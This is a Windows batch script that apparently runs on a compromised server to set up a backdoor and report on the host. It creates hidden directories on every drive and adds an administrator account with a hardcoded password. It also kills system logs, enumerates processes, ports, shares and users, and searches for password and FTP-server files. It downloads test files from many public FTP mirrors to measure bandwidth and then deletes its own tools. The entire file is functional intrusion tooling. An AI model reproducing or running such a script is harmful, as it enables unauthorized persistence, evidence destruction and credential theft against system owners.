@echo off
@echo off
md %SystemRoot%\system32\spool\drivers\boulvd\2\LEGION
md %SystemRoot%\system32\spool\drivers\w32x86\boulvd\2\LEGION
md %SystemRoot%\system32\spool\winit\inet
md \\.\c:\recycler\boulvd\r00t\LEGION\C
md \\.\d:\recycler\boulvd\r00t\LEGION\D
md \\.\e:\recycler\boulvd\r00t\LEGION\E
md \\.\f:\recycler\boulvd\r00t\LEGION\F
md \\.\g:\recycler\boulvd\r00t\LEGION\G
md \\.\h:\recycler\boulvd\r00t\LEGION\H
md \\.\i:\recycler\boulvd\r00t\LEGION\I
md \\.\j:\recycler\boulvd\r00t\LEGION\J
md \\.\k:\recycler\boulvd\r00t\LEGION\K
md \\.\L:\recycler\boulvd\r00t\LEGION\L
md \\.\M:\recycler\boulvd\r00t\LEGION\M
md \\.\N:\recycler\boulvd\r00t\LEGION\N
md \\.\O:\recycler\boulvd\r00t\LEGION\O
md \\.\P:\recycler\boulvd\r00t\LEGION\P
md \\.\Q:\recycler\boulvd\r00t\LEGION\Q
md \\.\R:\recycler\boulvd\r00t\LEGION\R
md \\.\S:\recycler\boulvd\r00t\LEGION\S
md \\.\T:\recycler\boulvd\r00t\LEGION\T
md \\.\U:\recycler\boulvd\r00t\LEGION\U
md \\.\V:\recycler\boulvd\r00t\LEGION\V
md \\.\W:\recycler\boulvd\r00t\LEGION\W
md \\.\X:\recycler\boulvd\r00t\LEGION\X
md \\.\Y:\recycler\boulvd\r00t\LEGION\Y
md \\.\Z:\recycler\boulvd\r00t\LEGION\Z
cd %SystemRoot%\system32\Winit\tmp\
net user Admins l3g!0n6x6 /add
net localgroup administrators /add Admins
regedit /s h.reg
cd %SystemRoot%\system32\Winit\tmp\
net stop Slave
cd %SystemRoot%\
del slave.exe
cd %SystemRoot%\system32\winit\tmp\
my_Slave.exe
sleep 2
del my_Slave.exe
sleep 2
cd %SystemRoot%\system32\winit\tmp\
echo *-------------------------------------------------------------------*>info.txt
sysInfo.exe>>info.txt
echo *-------------------------------------------------------------------*>>info.txt
echo *--List of Current Processes Running....                          --*>>info.txt
echo *-------------------------------------------------------------------*>>info.txt
pm.exe -list>>info.txt
FHS.exe >>info.txt
knlps.exe -L >>info.txt
knlsc13.exe -law >>info.txt
echo *--List of AUTO-START Processes Running....                       --*>>info.txt
echo *-------------------------------------------------------------------*>>info.txt
echo *--List of PORTS IN USE....                                       --*>>info.txt
Fport.exe>>info.txt
port.exe -fport>>info.txt
echo *-------------------------------------------------------------------*>>info.txt
echo *--List AUTO START....                                            --*>>info.txt
AutoRun.exe>>info.txt
echo *--DELETE LOGS                         --*>>info.txt
echo *-------------------------------------------------------------------*>>info.txt
LogKiller.EXE>>info.txt
echo *-------------------------------------------------------------------*>>info.txt
echo *--Result of speed test from various countries....                --*>>info.txt
echo *-------------------------------------------------------------------*>>info.txt
echo COUNTRY: DENMARK >>info.txt
ftpc.exe -n -A -s:ftpc.cmds ftp.dk.FreeBSD.org >Status-1of15
findstr /C:"bytes rec" Status-1of15>>info.txt
del ncurses.tar.gz
echo *-------------------------------------------------------------------*>>info.txt
echo COUNTRY: GERMANY >>info.txt
del Status-1of15
ftpc.exe -n -A -s:ftpc.cmds ftp.de.freebsd.org >Status-2of15
findstr /C:"bytes rec" Status-2of15 >>info.txt
del ncurses.tar.gz
echo *-------------------------------------------------------------------*>>info.txt
echo COUNTRY: NETHERLANDS >>info.txt
del Status-2of15
ftpc.exe -n -A -s:ftpc.cmds ftp2.nl.freebsd.org >Status-3of15
findstr /C:"bytes rec" Status-3of15 >>info.txt
del ncurses.tar.gz
echo *-------------------------------------------------------------------*>>info.txt
echo COUNTRY: USA >>info.txt
del Status-3of15
ftpc.exe -n -A -s:ftpc.cmds ftp1.FreeBSD.org >Status-4of15
findstr /C:"bytes rec" Status-4of15 >>info.txt
del ncurses.tar.gz
echo *-------------------------------------------------------------------*>>info.txt
echo COUNTRY: USA2 >>info.txt
del Status-4of15
ftpc.exe -n -A -s:ftpc2.cmds ftp.lucasarts.com >Status-5of15
findstr /C:"bytes rec" Status-5of15 >>info.txt
del Indyprev.zip
echo *-------------------------------------------------------------------*>>info.txt
echo COUNTRY: Canada >>info.txt
del Status-5of15
ftpc.exe -n -A -s:ftpca.cmds ftp.crc.ca >Status-6of15
findstr /C:"bytes rec" Status-6of15 >>info.txt
del latest-defs.exe
echo *-------------------------------------------------------------------*>>info.txt
echo COUNTRY: SWEDEN >>info.txt
del Status-6of15
ftpc.exe -n -A -s:ftpc.cmds ftp.se.FreeBSD.org >Status-7of15
findstr /C:"bytes rec" Status-7of15 >>info.txt
del ncurses.tar.gz
echo *-------------------------------------------------------------------*>>info.txt
echo COUNTRY: UK >>info.txt
del Status-7of15
ftpc.exe -n -A -s:ftpc.cmds ftp.uk.FreeBSD.org >Status-8of15
findstr /C:"bytes rec" Status-8of15 >>info.txt
del ncurses.tar.gz
echo *-------------------------------------------------------------------*>>info.txt
echo COUNTRY: FRANCE >>info.txt
del Status-8of15
ftpc.exe -n -A -s:ftpc.cmds ftp8.fr.FreeBSD.org >Status-9of15
findstr /C:"bytes rec" Status-9of15 >>info.txt
del ncurses.tar.gz
echo *-------------------------------------------------------------------*>>info.txt
echo COUNTRY: NL 2 >>info.txt
del Status-9of15
ftpc.exe -n -A -s:ftpco.cmds 194.171.240.20 >Status-10of15
findstr /C:"bytes rec" Status-10of15 >>info.txt
del patch-2.4.19.gz
echo *-------------------------------------------------------------------*>>info.txt
echo COUNTRY: NL 3 >>info.txt
del Status-10of15
ftpc.exe -n -A -s:ftpce.cmds ftp.euronet.nl >Status-11of15
findstr /C:"bytes rec" Status-11of15 >>info.txt
del 5M.bin
echo *-------------------------------------------------------------------*>>info.txt
echo COUNTRY: NL 4 >>info.txt
del Status-11of15
ftpc.exe -n -A -s:ftpcy.cmds ftp.chello.nl >Status-12of15
findstr /C:"bytes rec" Status-12of15 >>info.txt
del LT.zip
echo *-------------------------------------------------------------------*>>info.txt
echo COUNTRY: NO >>info.txt
del Status-12of15
ftpc.exe -n -A -s:ftpcx.cmds ftp.no.FreeBSD.org >Status-13of15
findstr /C:"bytes rec" Status-13of15 >>info.txt
del MBM5300.EXE
echo *-------------------------------------------------------------------*>>info.txt
echo COUNTRY: AT >>info.txt
del Status-13of15
ftpc.exe -n -A -s:ftpch.cmds ftp.chello.at >Status-14of15
findstr /C:"bytes rec" Status-14of15 >>info.txt
del dx5ger.exe
echo *-------------------------------------------------------------------*>>info.txt
echo COUNTRY: HU >>info.txt
del Status-14of15
ftpc.exe -n -A -s:ftpch.cmds ftp.chello.hu >Status-15of15
findstr /C:"bytes rec" Status-15of15 >>info.txt
del dx5ger.exe
del Status-15of15
echo *---------------------------------- DONE ---------------------------*>>info.txt

echo. > %computername%.txt
echo logged on >> %computername%.txt
echo _________ >> %computername%.txt
echo. >> %computername%.txt
log.exe >> %computername%.txt

echo. >> %computername%.txt
echo uptime stats >> %computername%.txt
echo ____________ >> %computername%.txt
echo. >> %computername%.txt
UT.exe /s >> %computername%.txt

echo ipconfig > %computername%.txt
echo ________ >> %computername%.txt
echo. >> %computername%.txt
%systemroot%\system32\ipconfig.exe /all >> %computername%.txt

echo. >> %computername%.txt
echo net stuff >> %computername%.txt
echo ________ >> %computername%.txt
echo. >> %computername%.txt
%systemroot%\system32\net.exe view >> %computername%.txt
echo. >> %computername%.txt
%systemroot%\system32\net.exe view /domain >> %computername%.txt
echo. >> %computername%.txt
%systemroot%\system32\net.exe group >> %computername%.txt
echo. >> %computername%.txt
%systemroot%\system32\net.exe localgroup >> %computername%.txt
echo. >> %computername%.txt
%systemroot%\system32\net.exe share >> %computername%.txt
echo. >> %computername%.txt
%systemroot%\system32\net.exe users >> %computername%.txt

echo. >> %computername%.txt
echo zoeke >> %computername%.txt
echo _____ >> %computername%.txt
echo. >> %computername%.txt
dir /s /a %SYSTEMDRIVE%\sites.dat >> flash.txt
dir /s /a %SYSTEMDRIVE%\*servu* >> su.txt
dir /s /a %SYSTEMDRIVE%\kill.exe >> %computername%.txt
dir /s /a %SYSTEMDRIVE%\*master* >> %computername%.txt
dir /s /a %SYSTEMDRIVE%\*.mpg >> %computername%.txt
dir /s /a %SYSTEMDRIVE%\*pass* >> %computername%.txt
dir /s /a %SYSTEMDRIVE%\*.avi >> %computername%.txt
dir /s /a %SYSTEMDRIVE%\*.rar >> rar.txt

del AutoRun.exe
del FindPass.exe
del log.exe
del ut.exe
del LogKiller.exe
del ftpc.cmds
del ftpc.exe
del ftpc2.cmds
del ftpca.cmds
del ftpce.cmds
del ftpch.cmds
del ftpco.cmds
del ftpcx.cmds
del ftpcy.cmds
del nt.bat
del h.reg
del sysInfo.exe
del hidden32.exe
del all.bat

:exit
exit
